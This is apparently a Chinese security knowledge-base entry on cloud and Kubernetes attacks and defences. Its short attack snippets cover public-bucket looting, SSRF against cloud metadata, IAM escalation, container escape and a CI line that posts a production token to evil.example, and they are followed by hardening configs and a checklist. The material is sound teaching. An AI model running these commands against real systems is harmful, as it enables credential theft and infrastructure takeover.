# 云与容器攻击 (Cloud & Container Attacks)

> 分类：云原生 / 基础设施 | 风险：严重 | MITRE T1078.004 / T1611 | 攻击链：初始访问 → 提权 → 横向

## 1. 攻击原理

云与容器把「边界」从网络移到了**身份与配置**。绝大多数云事故不是 0-day，而是配置错误、权限过度、密钥泄露。

### 云侧常见问题

| 问题 | 后果 |
|---|---|
| 存储桶公开 / ACL 错误 | 全量数据泄露 |
| IAM 过度授权（`*:*`） | 密钥泄露即全账号失守 |
| 长期 AccessKey 硬编码 | 代码泄露 → 云接管 |
| 元数据服务可访问（未强制 IMDSv2） | SSRF 直接拿临时凭据 |
| 安全组 `0.0.0.0/0` | 数据库、Redis、K8s API 暴露 |
| 快照/镜像公开 | 数据与密钥泄露 |
| 日志与审计未开启 | 无法发现与追溯 |
| 子域悬空记录 | 子域接管（`47-dns-attacks`） |
| 跨账号信任过宽 | 供应链式横向 |

### 容器 / K8s 常见问题

| 问题 | 后果 |
|---|---|
| `privileged: true` | 直接逃逸到宿主机 |
| 挂载 `docker.sock` / `/var/run` | 控制宿主机 Docker |
| `hostPath` 挂载宿主根目录 | 读写宿主文件系统 |
| 以 root 运行 + 可写根 FS | 提权与持久化 |
| RBAC 过宽（`cluster-admin`） | 接管集群 |
| ServiceAccount Token 自动挂载 | 被窃后调用 API |
| kubelet 10250 匿名访问 / etcd 2379 暴露 | 无认证控制节点 |
| 镜像来自不可信仓库、无签名 | 后门镜像 |
| 缺少 NetworkPolicy | 容器间任意横向 |
| CI/CD 密钥明文、流水线可被投毒 | 供应链攻击 |

## 2. 攻击示例

### 2.1 公开存储桶

```bash
aws s3 ls s3://company-backup --no-sign-request
aws s3 sync s3://company-backup ./loot --no-sign-request
```

### 2.2 SSRF → 云元数据

```http
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role
```

返回临时 `AccessKeyId` / `SecretAccessKey` / `Token`，攻击者配置 CLI 后即可操作云资源。

### 2.3 权限提升（IAM）

```bash
# 账号拥有 iam:PassRole + lambda:CreateFunction
aws lambda create-function --function-name x --role arn:aws:iam::123:role/admin ...
# 通过代入高权限角色实现提权
```

### 2.4 容器逃逸（特权 Pod）

```bash
# 在 privileged 容器内挂载宿主根目录
mkdir /mnt/host && mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
# 或写入宿主 crontab / SSH key
```

### 2.5 挂载 docker.sock

```bash
docker -H unix:///var/run/docker.sock run -v /:/host --privileged -it alpine
# 直接在宿主根文件系统操作
```

### 2.6 kubelet 未授权

```bash
curl -k https://node-ip:10250/pods
# 若返回 Pod 列表，可进一步 exec 进入容器
```

### 2.7 CI/CD 投毒

```yaml
# 攻击者在 PR 中修改脚本（若流水线用 pull_request_target 且检出 PR 代码）
- run: echo "${{ secrets.PROD_TOKEN }}" | curl -X POST https://evil.example --data-binary @-
```

## 3. 影响

- 云账号被接管：数据删除/加密、资源被用于挖矿、账单暴涨
- 容器逃逸 → 宿主机 → 整个集群 → 内网
- 供应链投毒影响所有下游用户
- 合规事故（数据跨境、个人信息泄露）

## 4. 防御措施

### 4.1 云

1. **身份优先**：短期凭据（OIDC / STS）、禁止长期 AK、密钥集中管理（KMS/Secrets Manager）。
2. **最小权限**：IAM 策略精确到资源与动作，使用 Permission Boundary、SCP、Access Analyzer 持续巡检。
3. **默认拒绝网络**：安全组仅放行必要来源；数据库/缓存/管理端口不暴露公网。
4. **存储**：Block Public Access、加密（SSE-KMS）、版本控制、访问日志。
5. **元数据**：强制 IMDSv2，hop limit = 1，禁止从容器访问。
6. **审计与检测**：CloudTrail / GuardDuty / Security Hub / Config Rules，异常 API 调用告警。
7. **账号与组织**：多账号隔离（生产/测试/安全）、集中日志、跨账号角色最小化。
8. **CSPM**：定期扫描配置漂移。

### 4.2 容器 / K8s

1. **Pod 安全**：`runAsNonRoot`、`readOnlyRootFilesystem`、`allowPrivilegeEscalation: false`、drop ALL capabilities、禁止 privileged、禁止 hostPath/hostNetwork。
2. **RBAC**：最小权限，禁用默认 ServiceAccount 自动挂载 Token，定期审计 `cluster-admin`。
3. **准入控制**：OPA/Gatekeeper、Kyverno、Pod Security Admission 强制基线。
4. **网络**：默认拒绝的 NetworkPolicy，限制出网。
5. **镜像**：最小基础镜像、漏洞扫描、签名（cosign）与验签、私有仓库、固定 digest。
6. **控制面**：kubelet 关闭匿名认证、etcd 仅内网 + mTLS、API Server 审计日志。
7. **Secrets**：外置 Secrets Manager / External Secrets，不把密钥写进镜像或 ConfigMap。

### 4.3 CI/CD

1. 流水线密钥最小权限、短期化（OIDC 联邦）。
2. 保护分支、环境审批、禁止 fork PR 直接读取生产密钥。
3. 固定 Action/镜像版本（digest），审计第三方 Action。
4. 构建产物签名 + SBOM（`28-supply-chain`）。

## 5. 配置与检测对比

```json
// ✅ 最小权限 IAM（只读指定桶）
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["s3:GetObject", "s3:ListBucket"],
    "Resource": ["arn:aws:s3:::app-assets", "arn:aws:s3:::app-assets/*"]
  }]
}
```

```bash
# ✅ 阻止公开访问 + 强制 IMDSv2
aws s3control put-public-access-block --account-id 123456789012 \
  --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true

aws ec2 modify-instance-metadata-options --instance-id i-xxx \
  --http-tokens required --http-put-response-hop-limit 1
```

```yaml
# ✅ 安全 Pod
apiVersion: v1
kind: Pod
metadata:
  name: app
spec:
  automountServiceAccountToken: false
  securityContext:
    runAsNonRoot: true
    runAsUser: 10001
    seccompProfile: { type: RuntimeDefault }
  containers:
    - name: app
      image: registry.example.com/app@sha256:...
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities: { drop: ["ALL"] }
      resources:
        limits: { cpu: "500m", memory: "256Mi" }
```

```yaml
# ✅ 默认拒绝的 NetworkPolicy
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: { name: default-deny, namespace: prod }
spec:
  podSelector: {}
  policyTypes: [Ingress, Egress]
```

```yaml
# ✅ CI：最小权限 + 环境审批
permissions:
  contents: read
  id-token: write          # OIDC，避免长期密钥
jobs:
  deploy:
    environment: production   # 需人工审批
    steps:
      - uses: actions/checkout@<sha>   # 固定 digest
      - run: ./deploy.sh
```

```yaml
# ✅ 检测：CloudTrail 高危 API
- alert: IAMPolicyChange
  expr: aws_cloudtrail_events{eventName=~"AttachUserPolicy|PutUserPolicy|CreateAccessKey"} > 0
- alert: PublicBucketCreated
  expr: aws_s3_bucket_public_access{public="true"} > 0
```

## 6. 自查清单

- [ ] 无长期 AccessKey，全部使用短期凭据 / OIDC
- [ ] IAM 最小权限，Access Analyzer 无高危发现
- [ ] 存储桶全部 Block Public Access + 加密
- [ ] 安全组无 `0.0.0.0/0` 的数据库/管理端口
- [ ] 强制 IMDSv2，容器不可访问元数据
- [ ] CloudTrail/GuardDuty/Config 已开启并告警
- [ ] 容器非 root、只读 FS、无特权、无 hostPath
- [ ] RBAC 最小化，Token 不自动挂载
- [ ] 准入控制（PSA/OPA/Kyverno）已启用
- [ ] NetworkPolicy 默认拒绝
- [ ] 镜像扫描 + 签名 + 固定 digest
- [ ] kubelet/etcd/API Server 不对公网暴露
- [ ] CI 密钥短期化，生产环境需审批
- [ ] 有子域与悬空记录巡检

## 7. 参考资料

- MITRE ATT&CK T1078.004: Cloud Accounts
- MITRE ATT&CK T1611: Escape to Host
- NSA/CISA: Kubernetes Hardening Guide
- CIS Benchmarks: AWS / Azure / GCP / Kubernetes
- OWASP Kubernetes Top 10
- 关联本库：`29-security-misconfiguration`、`31-ssrf`、`28-supply-chain`、`47-dns-attacks`
